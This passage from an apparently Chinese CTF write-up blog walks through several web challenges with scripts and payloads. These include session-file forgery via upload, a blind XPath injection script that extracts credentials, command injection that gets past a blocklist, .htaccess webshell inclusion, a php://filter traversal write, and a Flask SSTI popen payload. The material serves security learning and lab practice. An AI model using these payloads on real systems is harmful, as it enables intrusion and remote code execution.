class="token punctuation">,</span> <span class="token string single-quoted-string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/babyctf/"</span><span class="token operator">.</span><span class="token variable">$attr</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token operator">===</span><span class="token string double-quoted-string">"private"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dir_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"_"</span><span class="token operator">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Length: '</span><span class="token operator">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Disposition: attachment; filename="'</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"downloaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新知识：可以通过上传session文件伪造session</p><blockquote><p><strong>对于通过文件存储session的，不同的引擎存储方式有以下几种</strong></p><p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值<br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p></blockquote><p>看代码，拿到flag的条件是，<code>$_SESSION[&#39;username&#39;] ===&#39;admin&#39;</code>并且<code>/var/babyctf/success.txt</code>文件存在或<code>/var/babyctf/success.txt/</code>目录存在，首先尝试读取session文件判断session存储类型</p><pre class="line-numbers language-none"><code class="language-none">\x08usernames:5:&quot;guest&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明是php_binary方式存储的，下一步就是伪造session文件了，题目中文件上传后会被重命名为<code>文件名+_+文件内容的sha256计算后的内容</code>，编写脚本进行上传</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://650ec886-b0bc-410f-bb3c-0b8dda942bee.node4.buuoj.cn:81/index.php'</span><span class="token comment"># 第一步:上传伪造的session文件</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"up_file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"sess"</span><span class="token punctuation">,</span> BytesIO<span class="token punctuation">(</span><span class="token string">'\x08usernames:5:"admin";'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'direction'</span><span class="token punctuation">:</span> <span class="token string">'upload'</span><span class="token punctuation">,</span>    <span class="token string">'attr'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment"># 第二步:获取后面请求时的session_id</span>session_id <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token string">'\x08usernames:5:"admin";'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 第三步:在/var/babyctf/下创建success.txt目录</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'attr'</span><span class="token punctuation">:</span> <span class="token string">'success.txt'</span><span class="token punctuation">,</span>    <span class="token string">'direction'</span><span class="token punctuation">:</span> <span class="token string">'upload'</span><span class="token punctuation">&#125;</span>res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment"># 第四步:通过上面获取的session_id发起请求，获取flag</span>cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> session_id<span class="token punctuation">&#125;</span>flag_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="NPUCTF2020-ezlogin"   >          <a href="#NPUCTF2020-ezlogin" class="heading-link"><i class="fas fa-link"></i></a><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2>      <p>XXE是你吗XXE</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206111752709.png"></p><p>尝试了一遍发现不是，看wp是<span class="exturl"><a class="exturl__link"   href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/" >XPath注入</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，还有一个<span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/7791" >盲注</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>XPath中表示内容的方法（类似Linux中的文件结构）</p><pre class="line-numbers language-none"><code class="language-none">&#x2F; 根节点&#x2F;* 根结点下所有子节点&#x2F;&#x2F;*所有节点&#x2F;root&#x2F;* 根结点root下的所有子节点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一些好用的XPath函数</p><pre class="line-numbers language-none"><code class="language-none">count 返回结果的数量string-length 返回字符串长度name 返回节点名称substring 同MySQL中substr的用法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本题给个大佬脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> time session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://391bfefa-8949-4535-8129-07c86723c6b9.node4.buuoj.cn"</span>chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>head <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">#'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/xml'</span><span class="token punctuation">,</span>    <span class="token comment">#"Cookie":"UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c"</span>        <span class="token punctuation">&#125;</span> find <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;input type="hidden" id="token" value="(.*?)" />'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#猜测根节点名称</span>payload_1 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#猜测子节点名称</span>payload_2 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#猜测accounts的节点</span>payload_3 <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#猜测user节点</span>payload_4 <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token comment">#跑用户名和密码</span>payload_username <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span>payload_password <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span> <span class="token keyword">def</span> <span class="token function">get_token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#获取token的函数</span>    resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>  <span class="token comment">#如果在这里用headers会得到超时的界面</span>    token <span class="token operator">=</span> find<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment">#print(token)</span>    <span class="token keyword">return</span> token <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> get_token<span class="token punctuation">(</span><span class="token punctuation">)</span>        playload <span class="token operator">=</span> payload_username<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> char<span class="token punctuation">,</span> token<span class="token punctuation">)</span>   <span class="token comment">#根据上面的playload来改</span>        <span class="token comment">#print(playload)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>playload<span class="token punctuation">)</span>        <span class="token comment">#print(resp.text)</span>        <span class="token keyword">if</span> <span class="token string">"非法操作"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            result <span class="token operator">+=</span> char            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token string">"用户名或密码错误"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出结果为adm1n和md5解密后为gtfly123，登录成功，发现传参中含有文件参数，尝试php伪协议读取，被拦截，大小写绕过，读取/flag</p>        <h2 id="EasyBypass"   >          <a href="#EasyBypass" class="heading-link"><i class="fas fa-link"></i></a><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2>      <p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"#flag in /flag"</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm1</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm2</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file <span class="token interpolation"><span class="token variable">$comm1</span></span> <span class="token interpolation"><span class="token variable">$comm2</span></span>"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令1，2过滤内容并不相同，命令1中过滤较少，直接从这边下手，首先双引号闭合，分号结束命令，tac读取文件，通配符匹配文件，最终payload如下</p><pre class="line-numbers language-none"><code class="language-none">?comm1&#x3D;&quot;;tac &#x2F;f*;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="2020-新春红包题-1"   >          <a href="#2020-新春红包题-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2>      <p>这题和**[EIS 2019]EzPOP**完全一致，唯一不同就是在文件名处多了过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 使缓存文件名随机</span>    <span class="token variable">$cache_filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cache_filename</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$cache_filename</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处我们可以使用伪协议加目录穿越来绕过，传入<code>key = &quot;/../shell.php/.&quot;;</code>且<code>options[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=&#39;;</code>，此时内容变为：<code>php://filter/write=convert.base64-decode/resource=62a58e2e23e33/../shell.php</code>直接绕过</p>        <h2 id="羊城杯2020-easyphp"   >          <a href="#羊城杯2020-easyphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2>      <p>文件上传.htaccess包含利用，首先在htaccess文件中是有注释符的，就它#，但是php不读这个的啊，那么我们就上传.htaccess文件并包含htaccess并且注释掉一句话木马即可，末尾记得加反斜杠来转译换行，file使用\来绕过</p><pre class="line-numbers language-none"><code class="language-none">php_value auto_prepend_fil\e .htaccess#&lt;?php system(&#39;tac &#x2F;f*&#39;);?&gt;\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h2 id="XNUCA2019Qualifier-EasyPHP"   >          <a href="#XNUCA2019Qualifier-EasyPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2>      <p>这个非预期和上面那个一样，也是传入htaccess文件执行</p>        <h2 id="pasecactf-2019-flask-ssti"   >          <a href="#pasecactf-2019-flask-ssti" class="heading-link"><i class="fas fa-link"></i></a><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2>      <p>过滤了’，.，_，使用16进制绕过，直接给payload了</p><pre class="line-numbers language-none"><code class="language-none">nickname&#x3D;&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;tac app*&quot;)[&quot;read&quot;]()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是很明显看到源码也没啥用，因为flag已经被销毁了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'folow @osminogka.ann on instagram =)'</span><span class="token comment">#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe</span><span class="token triple-quoted-string string">'''def encode(line, key, key2):    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))app.config['flag'] = encode('', 